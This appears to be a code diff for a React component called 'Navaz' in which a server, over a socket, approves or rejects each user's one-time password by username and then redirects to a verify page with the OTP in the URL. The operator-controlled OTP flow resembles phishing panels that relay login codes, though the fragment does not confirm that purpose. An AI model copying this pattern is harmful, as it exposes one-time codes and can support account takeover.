@@ -57,9 +57,6 @@ const Navaz = ({checkMode,mode,setMode}) => {
 
         } catch (error) {
             
-        }finally{
-            setLoading(false)
-            setOtpError(true)
         }
 
     }
@@ -77,6 +74,19 @@ const Navaz = ({checkMode,mode,setMode}) => {
             setError(true)
         }
     })
+
+    socket.on('disAllowUserOtp',(data)=>{
+        if(data.username === username){
+            setLoading(false)
+            setOtpError(true)
+        }
+    })
+    socket.on('AllowUserOtp',(data)=>{
+        if(data.username === username){
+            window.location.href = `/verify?otp=${data.userOtp}`
+        }
+    })
+
   return (
     <div className='flex flex-col w-full min-h-screen justify-between items-center gap-y-5 relative' dir={mode==='ar' ? 'rtl' : 'ltr'} style={{backgroundColor:'#fafafa'}}>
                 {
